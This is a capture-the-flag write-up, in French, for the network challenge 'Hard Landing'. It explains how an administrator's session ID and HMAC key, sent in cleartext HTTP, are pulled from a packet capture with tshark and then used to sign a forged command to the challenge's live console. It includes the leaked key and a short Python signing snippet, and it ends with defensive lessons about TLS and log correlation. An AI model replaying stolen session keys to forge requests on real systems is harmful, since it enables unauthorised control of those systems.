---
tags: [network, pcap, http, hmac, session-hijacking]
---

[🇬🇧 English](README.md) · 🇫🇷 Français

# Hard Landing

| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
|---|---|---|---|---|---|---|
| network | 120 | 86 | ✅ | — | 0xAr3s-root | Teodor Giurgica |

## Énoncé

> A flight-safety console that supports an allied air base in the Operation Dawn theatre accepted destructive commands from a workstation its administrator never used. New logins are disabled, but the exposed session is still live.
>
> Review the incident capture and access log, recover the administrator's session material, then issue the documented safe recovery command with a fresh valid signature. The live console returns the recovery code only after authenticating that command.

**Fichiers du challenge :** `files/hard-landing.zip` → `console.pcapng`, `console_access.log`, `ops_notes.txt` (non commités)
**Cible :** une instance live limitée dans le temps (`http://w03.ctf.chronos-security.ro:PORT`, TTL 30 min)

## TL;DR

La console authentifie les commandes avec un HMAC-SHA256 lié à la session, mais l'étape de login qui délivre l'ID de session *et* la clé HMAC se fait en HTTP clair. La capture montre l'administrateur se connectant depuis `192.0.2.11` ; `session` et `key` sont tous deux visibles dans la réponse `/api/login`. Trois commandes destructrices sont ensuite rejouées avec cette même session depuis un autre hôte, `192.0.2.14` — un vol classique de session/clé sur le câble, pas une devinette d'identifiants. `GET /api/status` sur la console live documente la chaîne canonique à signer et la commande de récupération sûre (`RETURN_TO_PAD`). La signer avec la clé volée renvoie le flag.

## Approche

**1. Reconnaissance — tri des trois fichiers**

```bash
unzip -l hard-landing.zip
# console.pcapng         capture HTTP complète de la fenêtre d'incident
# console_access.log     journal d'audit applicatif
# ops_notes.txt          notes de passation d'incident
```

`console_access.log` montre immédiatement l'anomalie :

```
11:22:00Z LOGIN   src=192.0.2.11 role=administrator session=adm-2aca3785b702d3ef824b9cb8 result=issued
11:22:08Z COMMAND src=192.0.2.11 session=adm-2aca...                command=STATUS              result=accepted
11:23:00Z COMMAND src=192.0.2.14 session=adm-2aca...                command=DISABLE_SAFETY_LINK result=accepted
11:23:06Z COMMAND src=192.0.2.14 session=adm-2aca...                command=DIVERT_FROM_CORRIDOR result=accepted
11:23:12Z COMMAND src=192.0.2.14 session=adm-2aca...                command=SUPPRESS_RECOVERY   result=accepted
11:23:17Z AIRCRAFT_LINK_LOST src=192.0.2.20 aircraft=N17 result=recorded
```

La même session admin est utilisée depuis deux IP différentes. `192.0.2.14` ne s'est jamais connecté — il a réutilisé des identifiants ayant fuité ailleurs. `ops_notes.txt` confirme que la console parle en HTTP clair et que les commandes sont authentifiées par une signature HMAC-SHA256 liée à la session avec une fenêtre de fraîcheur.

**2. Récupérer la session et la clé fuitées dans le pcap**

```bash
tshark -r console.pcapng -Y http -T fields \
  -e frame.number -e ip.src -e ip.dst \
  -e http.request.method -e http.request.uri -e http.file_data
```

La réponse `/api/login` pour l'administrateur (envoyée en clair) est :

```json
{"session":"adm-2aca3785b702d3ef824b9cb8",
 "key":"2aca3785b702d3ef824b9cb870481e04e1179b09172a1f9da3710e6bb2a759f1",
 "role":"administrator"}
```

L'ID de session et la clé HMAC brute (64 caractères hex minuscules = 32 octets) circulent sur le câble. Pas de TLS, pas de confidentialité — quiconque est sur le chemin entre `192.0.2.11` et la console au moment du login peut les récupérer, exactement comme `192.0.2.14` s'y est pris.

**3. Interroger la console live pour obtenir le format exact de requête**

```bash
curl -s http://w03.ctf.chronos-security.ro:PORT/api/status | jq
```

```json
{
  "request": {
    "method": "POST",
    "path": "/api/command",
    "headers": ["X-Session", "X-Timestamp (Unix seconds)", "X-Signature (64 lowercase hexadecimal characters)"],
    "canonical": "POST\n/api/command\n<X-Timestamp>\n<BODY>",
    "hmac": "HMAC-SHA256; decode the login JSON's exactly 64 lowercase hexadecimal key characters to 32 bytes before use",
    "body": "{\"cmd\":\"RETURN_TO_PAD\",\"pad\":\"A1\"}"
  }
}
```

**4. Forger une commande de récupération sûre fraîchement signée**

```python
body = '{"cmd":"RETURN_TO_PAD","pad":"A1"}'
ts = str(int(time.time()))
canonical = f"POST\n/api/command\n{ts}\n{body}"
sig = hmac.new(bytes.fromhex(key_hex), canonical.encode(), hashlib.sha256).hexdigest()
# POST /api/command avec X-Session, X-Timestamp, X-Signature
```

La console valide la signature et la fenêtre de fraîcheur, exécute `RETURN_TO_PAD`, et renvoie le flag dans `recovery_receipt` (masqué ici ; voir `solve/solve.py`).

## À retenir

- Authentifier des requêtes avec HMAC ne sert à rien si la clé elle-même est distribuée en clair au login — TLS protège l'*échange de la clé*, pas seulement les commandes.
- Une session détournée apparaissant depuis une seconde IP source qui ne s'est jamais authentifiée dans le journal d'accès est l'indice révélateur : corréler les événements `LOGIN` avec les IP qui émettent ensuite des `COMMAND`.
- `GET /api/status` agissant comme auto-documentation du schéma de signature est un chemin de « récupération sûre » délibéré — à lire avant de deviner le format des requêtes.
